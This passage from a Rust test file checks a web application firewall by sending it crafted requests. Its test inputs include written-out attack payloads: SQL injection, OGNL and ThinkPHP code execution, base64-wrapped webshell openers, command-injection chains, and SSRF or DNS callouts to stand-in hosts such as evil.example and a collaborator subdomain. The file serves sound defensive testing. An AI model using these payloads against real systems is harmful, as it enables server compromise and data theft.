            "q=1'+AND+extractvalue(xmltype('<x/>'),'/l')+FROM+dual--",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // Truncated tautology tail (3e/ba).
        let v = e.inspect(&req("GET", "/sqli", "id=%27+or+1+limit+1+--"));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // Struts2 OGNL context-variable chain (ff/67).
        let v = e.inspect(&req(
            "GET",
            "/index.action",
            "redirect:%24%7B%23a%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')%7D",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // Chained ping probe (64/b5) — form body, `+` is space.
        let mut form = req("POST", "/exec", "");
        form.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        form.body = Some(
            b"ip=x%7C%7Cping+-c+10+127.0.0.1%7C%7C&Submit=Submit".to_vec(),
        );
        let v = e.inspect(&form);
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn p7_monitor_and_zero_signal_forms_block() {
        // Deterministic coverage for post11 strict-body Monitor/Pass
        // clusters; each case maps to one attribution bucket.
        let e = engine();
        // ThinkPHP dispatcher RCE route.
        let v = e.inspect(&req(
            "GET",
            "/index.php/",
            "s=index/%5Cthink%5Capp/invokefunction&function=call_user_func&vars%5B0%5D=md5&vars%5B1%5D=x",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // Short b64 tautology inside a JSON member (12B, under the old 16B
        // floor): `{"id":"MSBhbmQgMT0y"}` is `{"id":"1 and 1=2"}`.
        let v = e.inspect(&req(
            "GET",
            "/sqli",
            "id=%7B%22id%22%3A%22MSBhbmQgMT0y%22%7D",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // PHP webshell opener after JSON+b64 transport.
        let v = e.inspect(&req(
            "GET",
            "/sqli",
            "id=%7B%22id%22%3A%22PD9waHAgJF9QT1NUW2NtZF07%22%7D",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // Java serialized object magic inside ViewState (b64 of AC ED 00 05).
        let v = e.inspect(&req(
            "GET",
            "/res/login.jsf",
            "javax.faces.ViewState=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDR",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // Tomcat/F5 `..;/` path smuggling.
        let v = e.inspect(&req("GET", "/xxx/..;/admin/", ""));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // DedeCMS template execution.
        let v = e.inspect(&req(
            "GET",
            "/tag_test_action.php",
            "partcode=%7Bdede:field%20name%3D%27source%27%20runphp%3D%27yes%27%7Decho%201%7B/dede:field%7D",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // LDAP blind-injection break variant `*)((|`.
        let v = e.inspect(&req(
            "GET",
            "/",
            "f=admin%2A%29%28%28%7Cuserpassword%3D%2A%29",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // Cacti poller backtick command execution.
        let v = e.inspect(&req(
            "GET",
            "/remote_agent.php",
            "action=polldata&local_data_ids%5B0%5D=6&host_id=1&poller_id=%60touch%20/tmp/success%60",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // Atlassian gadget SSRF proxy path.
        let v = e.inspect(&req(
            "GET",
            "/plugins/servlet/gadgets/makeRequest",
            "url=https://evil.example/x",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // SQL filesystem/time-based probes.
        let v = e.inspect(&req(
            "GET",
            "/sqli",
            "id=exec+master..xp_dirtree+%27//host/a%27",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        let v = e.inspect(&req(
            "GET",
            "/sqli",
            "id=dbms_pipe.receive_message%28%28%27a%27%29%2C10%29",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn plus_encoded_event_handler_in_referer_blocks() {
        // Referer reflects a previous probe with `+` for space; the event
        // handler opener must match the `+on…=` shape (strict mode —
        // Referer hits are demoted one severity below critical).
        let e = strict_engine();
        let mut r = req("GET", "/vulnerabilities/xss_r/", "name=");
        r.headers.push((
            "Referer".into(),
            "http://t/vuln?name=%3Cxss+onafterscriptexecute%3Dalert%281%29%3E"
                .into(),
        ));
        let v = e.inspect(&r);
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn p8_zero_signal_forms_block() {
        // Deterministic coverage for post11 misses still open after P7;
        // each case maps to one attribution family.
        let e = engine();
        // Quoted-JSON wrapper: the single-quote shell is a SQL/string
        // concatenation artifact; the inner b64 member must unpack (1a/f9).
        let v = e.inspect(&req(
            "GET",
            "/vulnerabilities/sqli/",
            "id=%27%7B%22id%22%3A%22L2V0Yy9wYXNzd2Q%3D%22%7D%27&Submit=Submit",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // Error-based exfiltration injected through a form-array key
        // (Drupal-style parameter name) (73/2c).
        let v = e.inspect(&req(
            "POST",
            "/?q=node&destination=node",
            "pass=lol&op=Log+in&name%5B0+or+updatexml%280%2Cconcat%280xa%2Cuser%28%29%29%2C0%29%23%5D=bob",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // PHP-CGI ini override on the exploit route (62/ce).
        let v = e.inspect(&req(
            "GET",
            "/cgi-bin/php5",
            "-d+allow_url_include%3Don+-d+safe_mode%3Doff",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // Tautology probe inside a path segment (3f/aa) — a prose slug does
        // not carry `and 1=1` between slashes.
        let v = e.inspect(&req(
            "GET",
            "/api/products/123%20and%201=1/reviews?page=2&size=10&sort=time",
            "",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        let v =
            e.inspect(&req("GET", "/blog/what-is-1-and-1-in-logic/notes", ""));
        assert_eq!(v.action, WafAction::Pass, "details: {}", v.details);
    }

    #[test]
    fn b64_wire_over_old_gate_ognl_blocks() {
        // 5.1KB base64 wire value (decoded: 3.8KB JSON) — the old 4096B
        // wire gate skipped the unwrap entirely, so the OGNL
        // `#context.get(` payload inside was invisible to every detector.
        let e = strict_engine();
        let mut form = req("POST", "/page", "");
        form.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        form.body = Some(
            format!("depreciation={body}", body = concat!(
                "eyJmaXJzdCI6IjEiLCJvZyI6IiNyZXE9I2NvbnRleHQuZ2V0KCdjb20ub3BlbnN5bXBob255Lnh3b3JrMicpIiIsInBhZCI6IkEy",
                "MzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3IiwicGFk",
                "IjoiQTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njci",
                "LCJwYWQiOiJBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIz",
                "NDU2NyIsInBhZCI6IkEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2",
                "NzhBMjM0NTY3IiwicGFkIjoiQTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhB",
                "MjM0NTY3OEEyMzQ1NjciLCJwYWQiOiJBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0",
                "NTY3OEEyMzQ1Njc4QTIzNDU2NyIsInBhZCI6IkEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3",
                "OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3IiwicGFkIjoiQTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEy",
                "MzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1NjciLCJwYWQiOiJBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1",
                "Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NyIsInBhZCI6IkEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4",
                "QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3IiwicGFkIjoiQTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIz",
                "NDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1NjciLCJwYWQiOiJBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2",
                "NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NyIsInBhZCI6IkEyMzQ1Njc4QTIzNDU2NzhB",
                "MjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3IiwicGFkIjoiQTIzNDU2NzhBMjM0",
                "NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1NjciLCJwYWQiOiJBMjM0NTY3",
                "OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NyIsInBhZCI6IkEy",
                "MzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3IiwicGFk",
                "IjoiQTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njci",
                "LCJwYWQiOiJBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIz",
                "NDU2NyIsInBhZCI6IkEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2",
                "NzhBMjM0NTY3IiwicGFkIjoiQTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhB",
                "MjM0NTY3OEEyMzQ1NjciLCJwYWQiOiJBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0",
                "NTY3OEEyMzQ1Njc4QTIzNDU2NyIsInBhZCI6IkEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3",
                "OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3IiwicGFkIjoiQTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEy",
                "MzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1NjciLCJwYWQiOiJBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1",
                "Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NyIsInBhZCI6IkEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4",
                "QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3IiwicGFkIjoiQTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIz",
                "NDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1NjciLCJwYWQiOiJBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2",
                "NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NyIsInBhZCI6IkEyMzQ1Njc4QTIzNDU2NzhB",
                "MjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3IiwicGFkIjoiQTIzNDU2NzhBMjM0",
                "NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1NjciLCJwYWQiOiJBMjM0NTY3",
                "OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NyIsInBhZCI6IkEy",
                "MzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3IiwicGFk",
                "IjoiQTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njci",
                "LCJwYWQiOiJBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIz",
                "NDU2NyIsInBhZCI6IkEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2",
                "NzhBMjM0NTY3IiwicGFkIjoiQTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhB",
                "MjM0NTY3OEEyMzQ1NjciLCJwYWQiOiJBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0",
                "NTY3OEEyMzQ1Njc4QTIzNDU2NyIsInBhZCI6IkEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3",
                "OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3IiwicGFkIjoiQTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEy",
                "MzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1NjciLCJwYWQiOiJBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1",
                "Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NyIsInBhZCI6IkEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4",
                "QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3IiwicGFkIjoiQTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIz",
                "NDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1NjciLCJwYWQiOiJBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2",
                "NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NyIsInBhZCI6IkEyMzQ1Njc4QTIzNDU2NzhB",
                "MjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3IiwicGFkIjoiQTIzNDU2NzhBMjM0",
                "NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1NjciLCJwYWQiOiJBMjM0NTY3",
                "OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NyIsInBhZCI6IkEy",
                "MzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3IiwicGFk",
                "IjoiQTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njc4QTIzNDU2NzhBMjM0NTY3OEEyMzQ1Njd9"
            ))
                .into_bytes(),
        );
        let v = e.inspect(&form);
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn union_comment_glued_split_blocks() {
        // `union#filler...select` with the keyword glued to the comment and
        // `select` glued to a digit — the newline-deletion gluing that a
        // plain `\bselect\b` right edge cannot see.
        let e = strict_engine();
        let mut form = req("POST", "/page", "");
        form.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        form.body = Some(
            b"refresh=4+AND+x+union%23+fillerfillerfiller+select1+%23".to_vec(),
        );
        let v = e.inspect(&form);
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn union_teaching_sql_with_spaced_comment_passes() {
        // `UNION -- comment\nSELECT` (honest teaching SQL) and prose with a
        // spaced `#` hashtag must not fire the glued-comment split — the
        // comment marker must sit directly behind `union`.
        let e = strict_engine();
        let mut form = req("POST", "/page", "");
        form.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        form.body = Some(
            b"q=UNION+--+pick+a+plan%0ASELECT+x+FROM+t&n=the+union+%231+selects+members"
                .to_vec(),
        );
        let v = e.inspect(&form);
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn monitor_upgrade_shapes_block() {
        // Four Monitor-only forms raised to critical compositions:
        // ldap:// scheme carrying a framed newline (SSRF wire smuggling),
        // a command interleaved with an empty backtick pair behind `;`,
        // raw backticks in the URL path (command substitution), and a
        // scheme prefix glued to backslash traversal (remote include).
        let e = strict_engine();

        let q = req(
            "GET",
            "/",
            "url=ldap%3A%2F%2Fevil.com%3A11211%2F%0astats%0aquit",
        );
        let v = e.inspect(&q);
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);

        let mut form = req("POST", "/vulnerabilities/exec/", "");
        form.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        form.body = Some(b"ip=127.0.0.1%3Bwh%60%60oami&Submit=Submit".to_vec());
        let v = e.inspect(&form);
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);

        let v = e.inspect(&req("GET", "/ax--exec=`id`--remote=origin", ""));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);

        let v = e.inspect(&req(
            "GET",
            "/include/thumb.php",
            "dir=http\\..\\admin\\login\\login_check.php",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn ssrf_ldap_url_without_newline_stays_monitor() {
        // A plain ldap:// URL (directory integration) must not hit the
        // smuggling composition — no decoded newline inside the scheme.
        let e = strict_engine();
        let v = e.inspect(&req(
            "GET",
            "/search",
            "base=ldap%3A%2F%2Fds.example.com%2Fdc%3Dcorp",
        ));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn key_only_b64_sqli_and_double_exec_extension_block() {
        // Key-only b64 onion (86/bf): the entire SQLi payload rides in a
        // 564B parameter name — base64 wrapping `%2528select extractvalue…`,
        // which is itself double percent encoding. The key must clear the
        // old 512-byte scan gate and ride the same b64 unwrap as values.
        let e = strict_engine();
        let v = e.inspect(&req(
            "GET",
            "/",
            // spellchecker:off — base64 wire text, not prose
            concat!(
                "JTI1MjhzZWxlY3QlMjUyMGV4dHJhY3R2YWx1ZSUyNTI4eG1sdHlwZSUyNTI4",
                "JTI1MjclMjUzQyUyNTNGeG1sJTI1MjB2ZXJzaW9uJTI1M0QlMjUyMjEuMCUy",
                "NTIyJTI1MjBlbmNvZGluZyUyNTNEJTI1MjJVVEYtOCUyNTIyJTI1M0YlMjUz",
                "RSUyNTNDJTI1MjFET0NUWVBFJTI1MjByb290JTI1MjAlMjU1QiUyNTIwJTI1",
                "M0MlMjUyMUVOVElUWSUyNTIwJTI1MjUlMjUyMHZhcG90JTI1MjBTWVNURU0l",
                "MjUyMCUyNTIyJTI1MjclMjU3QyUyNTdDJTI1MjhzZWxlY3QlMjUyMHZlcnNp",
                "b24lMjUyMGZyb20lMjUyMHYlMjUyNGluc3RhbmNlJTI1MjklMjU3QyUyNTdD",
                "JTI1MjdCdXJwJTI1MkYlMjUyMiUyNTNFJTI1MjV2YXBvdCUyNTNCJTI1NUQl",
                "MjUzRSUyNTI3JTI1MjklMjUyQyUyNTI3JTI1MkZsJTI1MjclMjUyOSUyNTIw",
                "ZnJvbSUyNTIwZHVhbCUyNTI5"
            ),
            // spellchecker:on
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // image suffix camouflaging the executable handler.
        let v = e.inspect(&req("GET", "/uploadfiles/apache.php.jpeg", ""));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);

        // Form-array parameter names (`subPayType[deduct][]`, the Tencent
        // billing family): bare chained indexes on the new form-key scan
        // surface must not ride the js-call shape.
        let e = strict_engine();
        let mut r = req("POST", "/cgi/v2/transactions/getListV2", "");
        r.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        r.body = Some(
            b"subPayType%5Bdeduct%5D%5B%5D=panshi&subPayType%5Breturn%5D%5B%5D=trade&payType%5B%5D=all".to_vec(),
        );
        let v = e.inspect(&r);
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);

        // Quoted bracket-chain riding as a form key stays blocked
        // (`this['constructor']['constructor']` prototype-pollution prep).
        let mut r = req("POST", "/api/render", "");
        r.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        r.body = Some(
            b"this%5B%27constructor%27%5D%5B%27constructor%27%5D=payload"
                .to_vec(),
        );
        let v = e.inspect(&r);
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);

        // Ordinary asset paths stay untouched.
        let v = e.inspect(&req("GET", "/static/app.min.js", ""));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
        let v = e.inspect(&req("GET", "/assets/logo.png", ""));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
        // webpack DLL bundle naming (`vendor.dll.js`) is standard build
        // output, not an upload-bypass tail — desktop-binary extensions stay
        // out of the dangerous set.
        let v = e.inspect(&req(
            "GET",
            "/store/activity/public/vendor.fee62103.dll.js",
            "",
        ));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn drupal_render_key_form_rce_blocks() {
        // Drupalgeddon render-array keys (`mail[#post_render][]=exec`,
        // ff/fb): the `#`-prefixed property key is the attack carrier, not
        // the bare bracket chain the old js-call shape happened to catch.
        let e = strict_engine();
        let mut r = req("POST", "/user/register?ajax_form=1", "");
        r.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        r.body = Some(
            b"form_id=user_register_form&mail%5B%23post_render%5D%5B%5D=exec&mail%5B%23markup%5D=id"
                .to_vec(),
        );
        let v = e.inspect(&r);
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn b64_transport_control_chars_no_longer_split_sql_keywords() {
        // b64 tautology with transport padding (66b7): the decoded layer
        // carries a stray NUL glued to `OR` (`OR\0/* … */"1"="1"`) — the
        // NUL broke both the libinjection token and the `\bor\b` regex.
        // Control chars (minus \t\n\r) now become spaces before scanning.
        let e = strict_engine();
        let v = e.inspect(&req(
            "GET",
            "/",
            // spellchecker:off — base64 wire text, not prose
            "roll%20off=YWRtaU4iKSAjIGNhbGVuZGFyIApPUgAvKiANYXJlYXN0aGVtZXRhc21hbiAqLyIxIj0iMSItLQ==",
            // spellchecker:on
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn quoted_b64_run_inside_json_array_unwraps() {
        // b64 hidden inside a quoted string of a larger JSON-array value
        // (a4e0 family): whole-value b64 does not apply, but the quoted run
        // extraction (Strict-only) lifts the inner layer where the
        // comment-split tautology waits.
        let e = strict_engine();
        let v = e.inspect(&req(
            "GET",
            "/",
            // spellchecker:off — base64 wire text, not prose
            "traceability=%5B%22tag%22%2C%22MSAjIGEKT1IALyogDWIgKi8iMSI9IjEiLS0%3D%22%5D",
            // spellchecker:on
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn python_chr_chain_blocks() {
        // Python codepoint chain (`02d0`): `chr(97)) or 1: print
        // chr(121)+chr(101)+chr(115)` — codepoint concatenation is
        // evaluation input, never prose.
        let e = strict_engine();
        let v = e.inspect(&req(
            "GET",
            "/audit/gui_detail_view.php",
            "token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)&login=admin",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn utf7_and_alert1_probes_block() {
        let e = strict_engine();
        // UTF-7 markup opener (`fda1`): `+ADw-script+AD4-prompt(1)…`.
        let v = e.inspect(&req(
            "GET",
            "/",
            "name=%2B%2Fv8+%2BADw-script%2BAD4-prompt(1)%2BADw-%2Fscript%2BAD4-",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // Literal smoke-test probe (`4b67`).
        let v = e.inspect(&req(
            "GET",
            "/vulnerabilities/xss_r/",
            "name=%7B%7D.%22%29%29%29%3Balert(1)%2F%2F%22%3B",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn asp_one_liner_webshell_blocks() {
        // ASP one-liner (`357e`): b64 transport over `<%eval request("sb")%>`.
        let e = strict_engine();
        let v = e.inspect(&req(
            "GET",
            "/",
            "push=PCVldmFsIHJlcXVlc3QoInNiIiklPg%3D%3D",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn base64_html_entity_inner_payload_blocks() {
        // b64 transport wrapping an HTML-entity-encoded meta-refresh with a
        // javascript: target (05/4a): the b64 expansion must entity-decode
        // the inner layer so the script URI becomes visible with its tag
        // context.
        let e = engine();
        let mut form = req("POST", "/page", "");
        form.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        form.body = Some(
            concat!(
                "depreciation=PG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0i",
                "MjsgdXJsPScmI3g0YTthdmFzY3JpcHQ6YWxlcnQoMSknIj4=&Submit=x",
            )
            .as_bytes()
            .to_vec(),
        );
        let v = e.inspect(&form);
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    fn strict_form(body: &[u8]) -> WafVerdict {
        let e = strict_engine();
        let mut r = req("POST", "/x", "");
        r.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        r.body = Some(body.to_vec());
        e.inspect(&r)
    }

    #[test]
    fn single_quoted_b64_sql_dict_blocks() {
        // (`710c90` family): SQL payload wrapped in a Python-dict form value
        // whose b64 run sits inside single quotes — the quoted-run gate must
        // accept matching single quotes, not only double ones.
        let v = strict_form(
            b"id=%7B%27id%27%3A+%27MCcgfHwgMj0xZTF1bmlvbiBhbGwgLyohc2VsZWN0Ki8gMSwgMiM%3D%27%7D&Submit=Submit",
        );
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn cmd_git_lua_xstream_needles_block() {
        // P12 needle widening: tight `||` DNS chain, pipe into a filesystem
        // write, git client option injection, Lua os-library escape, and
        // XStream custom-serialization XML.
        for (name, body) in [
            (
                "tight || dns chain",
                &b"ip=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||&Submit=Submit"[..],
            ),
            (
                "pipe into touch",
                &b"token=12312&client=ssh&ssh_priv=aaa|touch%20/tmp/success%3b"[..],
            ),
            (
                "git pager option",
                &b"query=--open-files-in-pager=touch+/tmp/success%3B"[..],
            ),
            (
                "git upload-pack option",
                &b"path=--upload-pack%3Devil%40host%3Arepo.git"[..],
            ),
            (
                "lua os escape",
                &b"script=local+_M+%3D+{}+local+os+%3D+require('os')"[..],
            ),
            (
                "xstream custom xml",
                &b"<java.util.PriorityQueue+serialization='custom'><unserializable-parents/>"[..],
            ),
        ] {
            let v = strict_form(body);
            assert_eq!(v.action, WafAction::Block, "{name}: {}", v.details);
        }
    }

    fn strict_json(body: &[u8]) -> WafVerdict {
        let e = strict_engine();
        let mut r = req("POST", "/x", "");
        r.headers
            .push(("Content-Type".into(), "application/json".into()));
        r.body = Some(body.to_vec());
        e.inspect(&r)
    }

    #[test]
    fn nexus_el_probe_and_java_runtime_blocks() {
        // P13 needle widening: Unomi MVEL statement-separated `Runtime r =
        // Runtime.getRuntime(); r.exec(…)` (the chained CI-043 form never
        // occurs here), Nexus EL arithmetic probes `$\A{…}` / `$\B{…}`
